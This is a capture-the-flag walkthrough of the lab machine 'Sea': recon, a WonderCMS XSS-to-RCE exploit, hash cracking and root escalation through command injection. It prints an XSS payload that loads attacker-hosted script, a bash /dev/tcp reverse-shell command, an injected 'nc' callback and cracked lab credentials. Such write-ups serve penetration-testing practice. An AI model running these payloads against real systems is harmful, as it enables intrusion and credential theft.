# NMAP

TARGET: 10.129.32.234
ME: 10.10.14.217

```
┌──(xmen㉿kali)-[~/Documents/notes]
└─$ sudo nmap -sC -sV -p- -Pn 10.129.32.234 --max-retries 1
[sudo] password for xmen: 
Sorry, try again.
[sudo] password for xmen: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-29 00:47 -0400
Nmap scan report for 10.129.32.234
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.06 seconds
```

# Port 80

sea.htb host added to /etc/hosts

Contact page is a php page, possible SQLi or XSS but no evidence for it

Found a data directory with dirb but its forbidden by default

messages is another such directory - might be where contact.php writes to

Nikto shows nothing interesting either:

```
└─$ nikto -host http://sea.htb       
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.32.234
+ Target Hostname:    sea.htb
+ Target Port:        80
+ Start Time:         2026-04-29 00:59:21 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /home/: This might be interesting.
+ 7962 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2026-04-29 01:04:07 (GMT-4) (286 seconds)
---------------------------------------------------------------------------
```

Finding nothing great here, tried some more dirb and inspection based on the source of the CSS (and reading the source for pages looking for comments and such). Looking at the directory for CSS does make it look like a "bike" theme is being used and the CSS is being pulled from it:

CSS at http://sea.htb/themes/bike/css/style.css
Folder exists at both http://sea.htb/themes/bike/css and http://sea.htb/themes/bike/html/

dirb against http://sea.htb/themes/bike/html/ shows a LICENSE file at http://sea.htb/themes/bike/html/LICENSE

```
MIT License

Copyright (c) 2019 turboblack

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

Searching for turboblack shows https://github.com/turboblack/black as the 1st result  which means WonderCMS is what's running on the server and using this theme (maybe a bit modified)

Searchsploit shows a few hits for this CMS:

```
└─$ searchsploit wonder 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Photo Org WonderApplications 8.3 iOS - Local File Inclusion                                                                                                                                               | ios/webapps/33996.txt
Wonder CMS 2.3.1 - 'Host' Header Injection                                                                                                                                                                | php/webapps/43964.txt
Wonder CMS 2.3.1 - Unrestricted File Upload                                                                                                                                                               | php/webapps/43963.txt
WonderCMS 0.3.3 - 'editText.php' Cross-Site Scripting                                                                                                                                                     | php/webapps/35185.txt
WonderCMS 2.1.0 - Cross-Site Request Forgery                                                                                                                                                              | php/webapps/42205.html
WonderCMS 3.1.3 - 'content' Persistent Cross-Site Scripting                                                                                                                                               | php/webapps/49085.txt
WonderCMS 3.1.3 - 'Menu' Persistent Cross-Site Scripting                                                                                                                                                  | php/webapps/49164.txt
WonderCMS 3.1.3 - 'page' Persistent Cross-Site Scripting                                                                                                                                                  | php/webapps/49102.txt
WonderCMS 3.1.3 - 'uploadFile' Stored Cross-Site Scripting                                                                                                                                                | php/webapps/49109.txt
WonderCMS 3.1.3 - Authenticated Remote Code Execution                                                                                                                                                     | php/webapps/49155.py
WonderCMS 3.1.3 - Authenticated SSRF to Remote Remote Code Execution                                                                                                                                      | php/webapps/49154.py
WonderCMS 3.4.2 - Remote Code Execution (RCE)                                                                                                                                                             | php/remote/52271.py
Wondercms 4.3.2 - XSS to RCE     
```

[Docs](https://www.wondercms.com/docs/) also show that the default login URL of /loginURL still works on this site. Tried a few passwords but no luck.

Exploit 52271 from exploit DB chains an XSS with a theme install based RCE. This would make sense since there is a "your cool website" field on the contact form, which could contain a link from us.

Ran the exploit with some modifications to pass in a full Ivan Sincek PHP shell from revshells instead of the generic GET parameter to system() shell in the exploit

```
┌──(xmen㉿kali)-[~]
└─$ python 52271.py --url http://sea.htb/loginURL --xip 10.10.14.217 --xport 80
[+] Creating PHP Web Shell
[!] Directory malicious already exists!
[+] Writing malicious.js
[+] XSS Payload:
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.217:80/malicious.js"></script><form+action="
[+] Web Shell can be accessed once .zip file has been requested:
http://sea.htb/themes/malicious/malicious.php?cmd=<COMMAND>
[+] To get a reverse shell connection run the following:
curl -s 'http://sea.htb/themes/malicious/malicious.php' --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'" 
[+] Starting HTTP server
Serving HTTP on 10.10.14.217 port 80 (http://10.10.14.217:80/) ...
10.129.32.234 - - [29/Apr/2026 01:59:10] "GET /malicious.js HTTP/1.1" 200 -
10.129.32.234 - - [29/Apr/2026 01:59:20] "GET /malicious.zip HTTP/1.1" 200 -
10.129.32.234 - - [29/Apr/2026 01:59:21] "GET /malicious.zip HTTP/1.1" 200 -
10.129.32.234 - - [29/Apr/2026 01:59:21] "GET /malicious.zip HTTP/1.1" 200 -
10.129.32.234 - - [29/Apr/2026 01:59:21] "GET /malicious.zip HTTP/1.1" 200 -
```

After posting the `http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.217:80/malicious.js"></script><form+action="` link in the form, got a callback from the presumed site admin leading to download of the zip. Then calling the /themes/malicious/malicious.php got a shell back on my listener

```
└─$ nc -lvnp 9000                    
listening on [any] 9000 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.32.234] 46388
SOCKET: Shell has connected! PID: 6511
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty; pty.spawn("/bin/bash")'
bash: line 2: python: command not found
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@sea:/var/www/sea/themes/malicious$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@sea:/var/www/sea/themes/malicious$ 
```

In the data directory from earlier, found a database.js with a password hash in it:

```
www-data@sea:/var/www/sea/data$ cat database.js
cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2026\/04\/28 23:02:00": "127.0.0.1",
            "2026\/04\/28 22:08:58": "127.0.0.1",
            "2026\/04\/28 22:00:57": "127.0.0.1",
            "2024\/07\/31 15:17:10": "127.0.0.1",
            "2024\/07\/31 15:15:10": "127.0.0.1"
        },
        "lastModulesSync": "2026\/04\/28",
        "customModules": {
            "themes": {},
            "plugins": {}
        },
        "menuItems": {
            "0": {
                "name": "Home",
                "slug": "home",
                "visibility": "show",
                "subpages": {}
            },
            "1": {
                "name": "How to participate",
                "slug": "how-to-participate",
                "visibility": "show",
                "subpages": {}
            }
        },
```

```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```

For some reason John was unable to handle this hash type and hashcat identifies it as one of many possible types. Going with generic bcrypt aka Blowfish (Unix) worked in HashCat.


```
┌──(xmen㉿kali)-[~]
└─$ hashcat -a 0 hash /usr/share/wordlists/rockyou.txt  
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i5-8365U CPU @ 1.60GHz, 14933/29867 MB (4096 MB allocatable), 8MCU

The following 6 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  25600 | bcrypt(md5($pass))                                         | Generic KDF
  25800 | bcrypt(sha1($pass))                                        | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  28400 | bcrypt(sha512($pass))                                      | Generic KDF
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce
```

Got the password `mychemicalromance`

# Shell as Amay

Transitioned to SSH by adding a new key fingerprint to .ssh/authorized_keys

Running linpeas shows some internal only ports:

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                                                                                                
══╣ Active Ports (netstat)                                                                                                                                                                                                                  
tcp        0      0 127.0.0.1:56835         0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Network Traffic Analysis Capabilities

```

Used [[port-forwarding-with-ssh]] to forward ports 8080 and 56835

Used nmap on my own localhost to scan and try to fingerprint these 2 ports:

```
└─$ nmap -sC -sV -p56835,8080 127.0.0.1                            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-29 03:52 -0400
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000026s latency).

PORT      STATE SERVICE VERSION
8080/tcp  open  http    PHP cli server 5.5 or later (PHP 7.4.3-4ubuntu2.23)
| http-auth: 
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=Restricted Area
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
56835/tcp open  unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.43 seconds
```

Not able to do much with port 56835 but port 8080 shows up as a website with a login

Able to login with the same creds for this amay user

The only input here is the dropdown which leads to a post request. This shows up as a file selector but making direct POST requests with different body works to read local files. This is able to also read etc/passwd and etc/shadow.

Messing with the input shows this seems to go into some kind of eval somewhere as I am able to make a nc connection from the box to my machine by passing in data to the POST request as such:

```
log_file=%2Fetc%2Fshadow;nc 10.10.14.217 9001&analyze_log=id
```

should be able to pass in a reverse shell instead but can't get that to work. Able to make it run a bash script though, which let's me write a bash script from the ssh shell as amay and have it put the same public key into root's authorized keys.

Able to then ssh in as root using the same private key.

```
└─$ ssh root@sea.htb -i amay                                  
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 14 Aug 2024 03:25:50 PM UTC

  System load:  0.24              Processes:             248
  Usage of /:   60.6% of 6.51GB   Users logged in:       0
  Memory usage: 5%                IPv4 address for eth0: 10.10.11.28
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Aug 14 15:25:51 2024
root@sea:~# id
uid=0(root) gid=0(root) groups=0(root)
root@sea:~# cat root.txt
521a2233e6f74864e049ecea42fb30c0
root@sea:~# 
```

==DONE==